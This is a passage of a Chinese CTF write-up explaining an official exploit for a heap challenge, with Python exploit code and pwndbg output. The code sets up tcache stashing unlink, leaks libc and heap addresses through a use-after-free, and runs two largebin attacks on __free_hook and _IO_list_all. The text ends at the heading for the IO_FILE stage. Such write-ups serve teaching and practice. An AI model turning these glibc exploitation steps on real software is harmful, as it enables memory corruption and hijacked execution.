
(我太懒了，就直接拿官方exp来讲解了，师傅们包容包容orz)

## 第一部分，为`tcache_stashing_unlink`做准备

```python
Change(2)
for x in xrange(5):
Add(0x90, 'B'\*0x28) # B0~B4
Del(x) # B0~B4
#到这里0xa0的tcache中放入了5个chunk
Change(1)
Add(0x150, 'A'\*0x68) # A0
for x in xrange(7):
Add(0x150, 'A'\*0x68) # A1~A7
Del(1+x)
Del(0)
#将0x160的chunk放入到unsortedbin
Change(2)
Add(0xb0, 'B'\*0x28) # B5 split 0x160 to 0xc0 and 0xa0
#将0x160的chunk分割为0xc0和0xa0的，unsortedbin还剩下0xa0
Change(1)
Add(0x180, 'A'\*0x78) # A8
#将0xa0的unsortedbin放入smallbin，0xa0的smallbin目前有一个
for x in xrange(7):
Add(0x180, 'A'\*0x78) # A9~A15
Del(9+x)
Del(8)
#将0x190的chunk翻入unsortedbin
Change(2)
Add(0xe0, 'B'\*0x38) # B6 split 0x190 to 0xf0 and 0xa0
#切割unsortedbin，unsortedbin还剩下0xa0
#----- leak libc\_base and heap\_base
Change(1)
Add(0x430, 'A'\*0x158) # A16
#将0xa0的unsortedbin放入到smallbin，0xa0的chunk目前有两个
#至此，tcache\_stashing\_unlink的准备工作完成一部分
```

[![R8GVNF.png](upload/attach/202106/865862\_YGJH6UJ8XN347S4.jpg)](<mark class="encrypted">979K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6@1N6g2)9J5k6h3y4G2L8g2)9J5c8X3W2Q4x3V1k6d9z5p5N6h3e0V1k6Q4x3U0V1`.</mark>

此时的bins如上图

## 第二部分，泄露libc地址和heap地址

```python
Change(1)
Add(0x430, 'A'\*0x158) # A16
Change(2)
Add(0xf0, 'B'\*0x48) # B7
#B7作为A16和topchunk的隔离，防止A16被free后和topchunk合并
Change(1)
Del(16)
#free A16，将A16放入unsortedbin
Change(2)
Add(0x440, 'B'\*0x158) # B8
#申请一个比unsortedbin更大的chunk，将unsortedbin放入largebin，则largebin中有一个0x440的chunk
#由于largebin的bk和fd为libc地址，fd\_nextsize和bk\_nextsize为堆地址，因此可以通过这个largebin来泄露libc地址和heap地址
Change(1)
#切换角色，造成uaf
Show(16)
ru('message is: ')
libc\_base = uu64(rl()) - 0x1ebfe0
lg('libc\_base')
#利用uaf泄露libc地址
Edit(16, 'A'\*0xf+'\n')
Show(16)
ru('message is: '+'A'\*0xf+'\n')
heap\_base = uu64(rl()) - 0x13940
lg('heap\_base')
#使用edit覆盖fd和bk，泄露出heap地址
```

[![R8YmO1.png](upload/attach/202106/865862\_9RMJFGEZT8AKHPF.jpg)](<mark class="encrypted">e8dK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6@1N6g2)9J5k6h3y4G2L8g2)9J5c8X3W2Q4x3V1k6d9z5q4W2E0e0K6q4Q4x3U0V1`.</mark>

上图是将A16 free之后的情况

以及下图是此时的bins

[![R8YdTf.png](upload/attach/202106/865862\_BPZJXV7ESATVWWG.jpg)](<mark class="encrypted">295K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6@1N6g2)9J5k6h3y4G2L8g2)9J5c8X3W2Q4x3V1k6d9z5q4W2V1g2r3k6Q4x3U0V1`.</mark>

## 第三部分，第一次`largebin_attack`，将`free_hook-0x8`写为一个堆地址

```python
#----- first largebin\_attack
Edit(16, 2\*p64(libc\_base+0x1ebfe0) + '\n') # recover
#将0x440的largebin的fd和bk指针恢复
Add(0x430, 'A'\*0x158) # A17
#将largebin中的chunk申请回来
Add(0x430, 'A'\*0x158) # A18
Add(0x430, 'A'\*0x158) # A19
#后续使用
Change(2)
Del(8)
Add(0x450, 'B'\*0x168) # B9
#将B8 0x440的chunk放入largebin
Change(1)
Del(17)
#将A17 0x430的chunk放入unsortedbin
Change(2)
free\_hook = libc\_base + libc.sym['\_\_free\_hook']
Edit(8, p64(0) + p64(free\_hook-0x28) + '\n')
#修改B8的fd\_nextsize和bk\_nextsize，以满足largebin attack的要求 注：mummy的edit是直接从偏移0x10的位置写入，忘记了的可以看看程序
Change(3)
Add(0xa0, 'C'\*0x28) # C0 triger largebin\_attack, write a heap addr to \_\_free\_hook-8
#会从0x430的unsortedbin中切割0xb0的chunk之前，会先将这个0x430的chunk放到largebin上，再进行切割，切割之后会产生last remainder，再将last remainder放到unsortedbin上，在将unsortedbin放入largebin时就已经出发了largebinattack，往free\_hook-0x8处写入了一个堆地址
Change(2)
Edit(8, 2\*p64(heap\_base+0x13e80) + '\n') # recover
#恢复现场
```

这里解释一下`Add(0xa0, 'C'\*0x28)`为什么能触发`largebin_attack`

[![R8DquF.jpg](upload/attach/202106/865862\_ZUCRHE2UMFDQCG5.jpg)](<mark class="encrypted">feeK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6@1N6g2)9J5k6h3y4G2L8g2)9J5c8X3W2Q4x3V1k6d9z5p5c8I4N6f1k6Q4x3U0V1`.</mark>

在`int_malloc`函数的大循环开始处就会获取`unsortedbin`中的chunk

还是通过源码调试来看看，不过就只标出几个关键点，毕竟这不是本文的重点

[![R8rrVJ.png](upload/attach/202106/865862\_HQJFW5MMWP923W5.jpg)](<mark class="encrypted">d18K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6@1N6g2)9J5k6h3y4G2L8g2)9J5c8X3W2Q4x3V1k6d9z5s2u0J5g2V1A6Q4x3U0V1`.</mark>

```sh
pwndbg> p/x size
$2 = 0x440
pwndbg> p victim
$3 = (mchunkptr) 0x55a1135af940
unsortedbin
all: 0x55a1135af940 —▸ 0x7f61ad8c2be0 (main\_arena+96) ◂— 0x55a1135af940
```

取到了`unsortedbin`中的chunk

[![R8siR0.png](upload/attach/202106/865862\_UA84K5D4ZG4MQS7.jpg)](<mark class="encrypted">2a3K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6@1N6g2)9J5k6h3y4G2L8g2)9J5c8X3W2Q4x3V1k6d9z5s2y4A6f1U0m8Q4x3U0V1`.</mark>

[![R8sAMT.png](upload/attach/202106/865862\_C4AQJJB6QQBNKM5.jpg)](<mark class="encrypted">491K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6@1N6g2)9J5k6h3y4G2L8g2)9J5c8X3W2Q4x3V1k6d9z5s2y4m8e0g2c8Q4x3U0V1`.</mark>

将`unsortedbin`中的chunk解链

[![R8sKiR.png](upload/attach/202106/865862\_FEXVEHKSREKAYHX.jpg)](<mark class="encrypted">e08K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6@1N6g2)9J5k6h3y4G2L8g2)9J5c8X3W2Q4x3V1k6d9z5s2y4w2K9g2u0Q4x3U0V1`.</mark>

将`unsortedbin`插入到`largebin`

[![R8sNod.png](upload/attach/202106/865862\_V5MMMZCZZV558UP.jpg)](<mark class="encrypted">545K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6@1N6g2)9J5k6h3y4G2L8g2)9J5c8X3W2Q4x3V1k6d9z5s2y4z5L8$3c8Q4x3U0V1`.</mark>

这一步之后实际上就已经完成了`largebin attack`，但我们继续把流程走完

[![R8sRFs.png](upload/attach/202106/865862\_NR6YDHEEHNU8U57.jpg)](<mark class="encrypted">904K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6@1N6g2)9J5k6h3y4G2L8g2)9J5c8X3W2Q4x3V1k6d9z5s2y4d9c8Y4y4Q4x3U0V1`.</mark>

`largebin`中多出了一个chunk

后续会进行一大堆标志位设置，我们直接看到切割chunk

[![R8ySOO.png](upload/attach/202106/865862\_57XFFBW4HHSKQWP.jpg)](<mark class="encrypted">c84K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6@1N6g2)9J5k6h3y4G2L8g2)9J5c8X3W2Q4x3V1k6d9z5s2W2e0e0@1!0Q4x3U0V1`.</mark>

[![R8yVpt.png](upload/attach/202106/865862\_VU3PNRZY7ZX6B6X.jpg)](<mark class="encrypted">effK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6@1N6g2)9J5k6h3y4G2L8g2)9J5c8X3W2Q4x3V1k6d9z5s2W2h3M7s2c8Q4x3U0V1`.</mark>

切割了之前的`unsortedbin`，remainder产生

[![R8ylkj.png](upload/attach/202106/865862\_77PFZT9EDQ9KW3G.jpg)](<mark class="encrypted">fbaK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6@1N6g2)9J5k6h3y4G2L8g2)9J5c8X3W2Q4x3V1k6d9z5s2W2D9K9$3A6Q4x3U0V1`.</mark>

然后将`last_remainder`插入到`unsortedbin`中

[![R8yJ10.png](upload/attach/202106/865862\_ERCRRJ2YV9E8WG3.jpg)](<mark class="encrypted">748K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6@1N6g2)9J5k6h3y4G2L8g2)9J5c8X3W2Q4x3V1k6d9z5s2W2v1x3e0m8Q4x3U0V1`.</mark>

流程结束，第一次`largebin attack`完成

[![R8y0AJ.png](upload/attach/202106/865862\_82Y44HXXWRTR56R.jpg)](<mark class="encrypted">b25K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6@1N6g2)9J5k6h3y4G2L8g2)9J5c8X3W2Q4x3V1k6d9z5s2V1H3b7f1A6Q4x3U0V1`.</mark>

`free_hook-0x8`被写入了一个堆地址

## 第四部分 第二次`largebin attack`，往`_io_list_all`写入一个堆地址

```python
#----- second largebin\_attack
Change(3)
Add(0x380, 'C'\*0x118) # C1
#将lastremainder申请回来
Change(1)
Del(19)
#free A19，大小为0x430的chunk
Change(2)
IO\_list\_all = libc\_base + libc.sym['\_IO\_list\_all']
Edit(8, p64(0) + p64(IO\_list\_all-0x20) + '\n')
#故技重施，将largebin中的0x440的chunk的bk\_nextsize修改为IO\_list\_all-0x20
Change(3)
Add(0xa0, 'C'\*0x28) # C2 triger largebin\_attack, write a heap addr to \_IO\_list\_all
#和第三部分的一样，触发largebin\_attack
Change(2)
Edit(8, 2\*p64(heap\_base+0x13e80) + '\n') # recover
#恢复现场
```

[![R86CvV.png](upload/attach/202106/865862\_KKWPNSNGE5KNHTU.jpg)](<mark class="encrypted">9f0K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6@1N6g2)9J5k6h3y4G2L8g2)9J5c8X3W2Q4x3V1k6d9z5o6k6o6N6W2k6Q4x3U0V1`.</mark>

第二次`largebin attack`完成

## 第五部分 `tcache_stashing_unlink` plus `IO_FILE`攻击
